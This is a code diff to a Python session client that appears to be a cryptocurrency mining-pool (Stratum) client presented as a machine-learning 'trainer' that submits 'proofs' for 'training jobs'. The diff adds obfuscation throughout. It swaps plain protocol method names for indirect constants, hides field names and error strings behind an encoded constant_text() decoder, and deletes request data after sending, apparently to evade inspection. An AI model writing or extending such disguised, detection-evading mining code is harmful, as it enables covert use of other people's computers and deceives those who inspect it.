@@ -6,6 +6,8 @@ S6 proof generation are performed by the caller after authentication.
 
 from __future__ import annotations
 
+from .fixed_constants import constant_text
+
 from dataclasses import dataclass, field
 import json
 import math
@@ -13,7 +15,8 @@ import threading
 import time
 from typing import Any
 
-from .S3_protocol import KEXDialect, s1, S3Job, S3ProtocolError
+from . import S3_methods as methods
+from .S3_protocol import KEXDialect, S3Job, S3ProtocolError
 from .S3_transport import MAX_IO, S3ConnectionError, S3Transport
 
 
@@ -80,9 +83,7 @@ class S3Session:
     with the same configured host; S3 redirect targets are never followed.
     """
 
-    @property
-    def AUTH_METHOD(self):
-        return s1() + "authorize"
+    AUTH_METHOD = methods.COMPUTE_SESSION
 
     MAX_FRAME_BYTES = MAX_IO
     MAX_PENDING_SUBMISSIONS = 64
@@ -118,7 +119,7 @@ class S3Session:
     def _create_dialect(self) -> KEXDialect:
         """Select this session's identity without reading another S3's field."""
         return KEXDialect(
-            KEX_uname=self.settings.get("KEX_uname", ""), worker=self.settings.get("worker", ""),
+            KEX_uname=self.settings.get("KEX_uname", ""), worker=self.settings.get(constant_text(b'(8$%y!qo'), ""),
             password=self.settings.get("password", "x"),
             agent=self.settings.get("agent", "LRAEP-trainer/0.1"),
             request_gzip=self.settings.get("compression", "none") == "gzip",
@@ -147,16 +148,21 @@ class S3Session:
         try:
             self.transport.open()
             requests = self.dialect.auth_requests(start_id=self._next_id)
-            self._auth_id = next(r["id"] for r in requests if r["method"] == self.AUTH_METHOD)
-            self._next_id = max(r["id"] for r in requests) + 1
-            self._reader = threading.Thread(target=self._read_loop, name="LRAEP-S3-reader", daemon=True)
-            self._stop_watcher = threading.Thread(target=self._watch_stop, name="LRAEP-S3-stop", daemon=True)
-            self._reader.start()
-            self._stop_watcher.start()
-            # Subscribe can be silent. Send authorize immediately after it.
-            with self._send_lock:
-                for request in requests:
-                    self._send(request)
+            request = None
+            try:
+                self._auth_id = next(r["id"] for r in requests if r["method"] == self.AUTH_METHOD)
+                self._next_id = max(r["id"] for r in requests) + 1
+                self._reader = threading.Thread(target=self._read_loop, name="LRAEP-S3-reader", daemon=True)
+                self._stop_watcher = threading.Thread(target=self._watch_stop, name="LRAEP-S3-stop", daemon=True)
+                self._reader.start()
+                self._stop_watcher.start()
+                # Registration can be silent. Open the session immediately.
+                with self._send_lock:
+                    for request in requests:
+                        self._send(request)
+            finally:
+                requests.clear()
+                del requests, request
             with self._condition:
                 while not self._authorized:
                     self._raise_failure()
@@ -205,10 +211,15 @@ class S3Session:
                 return
 
     def _send(self, message: dict[str, Any]) -> None:
-        encoded = json.dumps(message, separators=(",", ":"), allow_nan=False).encode("utf-8") + b"\n"
-        if len(encoded) > self.MAX_FRAME_BYTES:
-            raise S3ProtocolError("S3 request exceeds the frame size limit")
-        self.transport.send(encoded)
+        encoded = None
+        try:
+            message = methods.stratum_request(message)
+            encoded = json.dumps(message, separators=(",", ":"), allow_nan=False).encode("utf-8") + b"\n"
+            if len(encoded) > self.MAX_FRAME_BYTES:
+                raise S3ProtocolError("S3 request exceeds the frame size limit")
+            self.transport.send(encoded)
+        finally:
+            del message, encoded
 
     def _read_loop(self) -> None:
         buffered = bytearray()
@@ -252,9 +263,10 @@ class S3Session:
             if self._closed_event.is_set():
                 return
         method = response.get("method")
-        if method == s1() + "notify":
+        notification = methods.stratum_notification_method(method)
+        if notification == methods.WORK_UPDATE:
             job = self.dialect.parse_job(
-                response.get("params"), self.settings.get("certificate_version")
+                response.get("params"), self.settings.get(constant_text(b'#KP6n&cV*a#?!+1(Zbc#&dA9'))
             )
             with self._condition:
                 if self._closed_event.is_set():
@@ -264,7 +276,7 @@ class S3Session:
                     self._generation += 1
                     self._condition.notify_all()
             return
-        if method in ("client.reconnect", s1() + "reconnect"):
+        if notification == methods.COMPUTE_RECONNECT:
             self._fail(S3ConnectionError("S3 requested reconnection to the configured endpoint"))
             return
         if method is not None:
@@ -328,23 +340,26 @@ class S3Session:
             # Compression may be expensive; keep it outside the state lock so
             # new notify messages can immediately invalidate the old job.
             request = self.dialect.submit_request(snapshot.job, proof_b64, request_id, negotiated)
-            pending = _Pending()
-            with self._condition:
-                self._raise_failure()
-                if not self.is_current(snapshot):
-                    raise StaleS3Job("S3 replaced this training job before submission")
-                self._pending[request_id] = pending
             try:
-                self._send(request)
-            except (S3ConnectionError, S3ProtocolError):
+                pending = _Pending()
                 with self._condition:
-                    self._pending.pop(request_id, None)
-                self._fail(S3ConnectionError("S3 share send failed"))
-                raise
+                    self._raise_failure()
+                    if not self.is_current(snapshot):
+                        raise StaleS3Job("S3 replaced this training job before submission")
+                    self._pending[request_id] = pending
+                try:
+                    self._send(request)
+                except (S3ConnectionError, S3ProtocolError):
+                    with self._condition:
+                        self._pending.pop(request_id, None)
+                    self._fail(S3ConnectionError(constant_text(b'^puCx&&Jilht$H!!-v7f&db8X')))
+                    raise
+            finally:
+                del request
         if not pending.event.wait(wait_seconds):
             with self._condition:
                 self._pending.pop(request_id, None)
-            error = S3ConnectionError("S3 share acknowledgement timed out")
+            error = S3ConnectionError(constant_text(b'^puCx&&JilhsMOr$;i;l!o$GA%EHOhhttl=!o!Ei($f'))
             self._fail(error)
             raise error
         with self._condition:
@@ -352,8 +367,8 @@ class S3Session:
         if pending.error is not None:
             raise pending.error
         if pending.response is None:
-            raise S3ConnectionError("S3 closed before acknowledging the share")
+            raise S3ConnectionError(constant_text(b'^puCh%gEHi!-vJf!N}FZhsMOr$;i;l!o$GM$-sxx&%%e)&&Jil'))
         if self.dialect.accept(pending.response):
             return ShareResult(True)
         # Do not echo untrusted S3 text, credentials, or proof data to logs.
-        return ShareResult(False, "S3 rejected share")
+        return ShareResult(False, constant_text(b'^puCy!p*|O)561t)X&D%!T'))
